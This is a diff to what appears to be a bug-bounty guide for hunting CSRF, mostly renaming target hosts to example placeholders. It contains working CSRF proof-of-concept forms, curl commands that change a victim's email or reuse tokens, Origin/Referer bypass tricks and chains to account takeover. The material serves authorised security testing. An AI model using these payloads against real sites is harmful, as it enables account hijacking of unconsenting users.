@@ -151,7 +151,7 @@ fetch('/api/heartbeat', {method: 'POST', body: JSON.stringify(data)})
 ```html
 <html>
 <body onload="document.forms[0].submit()">
-  <form method="POST" action="https://target.com/api/v1/account/link">
+  <form method="POST" action="https://target.example/api/v1/account/link">
     <input type="hidden" name="provider" value="attacker_account_id" />
     <input type="hidden" name="token" value="oauth_token_here" />
   </form>
@@ -163,7 +163,7 @@ fetch('/api/heartbeat', {method: 'POST', body: JSON.stringify(data)})
 ```html
 <html>
 <body onload="document.forms[0].submit()">
-  <form method="POST" action="https://target.com/api/heartbeat"
+  <form method="POST" action="https://target.example/api/heartbeat"
         enctype="text/plain">
     <!-- browser sends: {"status":"ok","x":"=padding"} -->
     <input type="hidden" name='{"status":"ok","x":"' value='padding"}' />
@@ -175,20 +175,20 @@ fetch('/api/heartbeat', {method: 'POST', body: JSON.stringify(data)})
 ### curl: Test CSRF token omission
 ```bash
 # Capture a valid request, then replay without token
-curl -s -X POST https://target.com/settings/email \
+curl -s -X POST https://target.example/settings/email \
   -H "Cookie: session=YOUR_SESSION" \
-  -d "email=attacker@evil.com" \
+  -d "email=attacker@evil.example" \
   -v 2>&1 | grep -E "HTTP|location|error"
 ```
 
 ### curl: Test token reuse across sessions
 ```bash
 # Get token from session A
-TOKEN_A=$(curl -s https://target.com/settings -H "Cookie: session=SESSION_A" \
+TOKEN_A=$(curl -s https://target.example/settings -H "Cookie: session=SESSION_A" \
   | grep -oP 'authenticity_token[^"]*value="\K[^"]+')
 
 # Use token A in session B's request
-curl -s -X POST https://target.com/settings/update \
+curl -s -X POST https://target.example/settings/update \
   -H "Cookie: session=SESSION_B" \
   -d "authenticity_token=$TOKEN_A&email=test@test.com" \
   -v
@@ -203,7 +203,7 @@ grep -Eo 'name="(csrf|_token|authenticity_token|csrfmiddlewaretoken)"[^>]*value=
 grep -B5 -A20 '<form method="[Pp][Oo][Ss][Tt]"' response.html | grep -L "csrf\|token\|nonce"
 
 # Check SameSite in response headers
-curl -sI https://target.com/login | grep -i "set-cookie"
+curl -sI https://target.example/login | grep -i "set-cookie"
 
 # Find RelayState parameters
 grep -r "RelayState" --include="*.js" .
@@ -211,7 +211,7 @@ grep -r "RelayState" --include="*.js" .
 
 ### Grafana CVE-2022-21703 version check
 ```bash
-curl -s https://monitoring.target.com/api/health | jq '.version'
+curl -s https://monitoring.target.example/api/health | jq '.version'
 # Vulnerable: < 8.3.5, < 8.4.3, < 7.5.15
 ```
 
@@ -255,9 +255,9 @@ curl -s https://monitoring.target.com/api/health | jq '.version'
 ### Defense: Referer/Origin header check
 **Bypasses:**
 - Null Origin: use sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`)
-- Subdomain bypass: if `*.target.com` is trusted and you have XSS on any subdomain
+- Subdomain bypass: if `*.target.example` is trusted and you have XSS on any subdomain
 - Referer stripping: HTTPS→HTTP transitions strip Referer header
-- Weak matching: `target.com.evil.com` passes naive string matching
+- Weak matching: `target.example.evil.example` passes naive string matching
 
 ### Defense: Double-submit cookie pattern
 **Bypass:** If attacker can set cookies (subdomain takeover, cookie injection via HTTP), they can set both the cookie and the form field to matching attacker-controlled values.
@@ -370,5 +370,6 @@ No Duende.BFF-direct CVE exists as of 2026-05. The three classes above are **des
 - **`hunt-xss`** — Any XSS on a trusted origin neutralizes CSRF defenses (token, SameSite, Origin check) instantly. Chain primitive: XSS reads the `meta[name=csrf-token]` value and same-origin-fetches `/accounts/email` with attacker payload → one-click ATO via attacker-page postMessage triggering the stored XSS to perform the state change.
 - **`hunt-auth-bypass`** — CSRF combined with an auth-bypass primitive lets attacker-side scripts perform state changes that should have required step-up auth. Chain primitive: CSRF on `/settings/password` reaches an endpoint that skips the re-auth check → password change executes without the victim ever entering their current password → ATO.
 - **`hunt-oauth`** — OAuth/SAML `state`/`RelayState` is structurally a CSRF token; missing validation here is account-linking CSRF. Chain primitive: attacker initiates OAuth on their account, sends victim the `/callback?code=X&state=` URL → victim's logged-in browser completes the link → attacker's social identity now controls victim's account.
+- **`hunt-dom`** — Client-side path traversal (CSPT) revives CSRF even where tokens/SameSite hold: the front-end builds the request, so the session cookie and CSRF token ride along; `../` only re-points where the request lands. Chain primitive: CSPT GET sink leaks an `id` into JSON → CSPT POST sink reuses it to fire a state change (Doyensec CSPT2CSRF) → account action with no attacker-forged request at all. Distinct from Citation #14 (CVE-2022-23732), which is a *server-side* router/token-scope differential, not client-side path traversal.
 - **`security-arsenal`** — Reach for the CSRF PoC templates (form POST, `enctype=text/plain` JSON, sandboxed-iframe null-origin, base64 multipart bypass) before writing one from scratch; also the WAF-bypass header variants for Origin/Referer checks.
 - **`triage-validation`** — Run the Pre-Severity Gate before submitting CSRF on a logout endpoint or any action without state-change consequence — those are the canonical N/A traps. Confirm victim LOSES something concrete (account access, money, data), not just "a request executed."
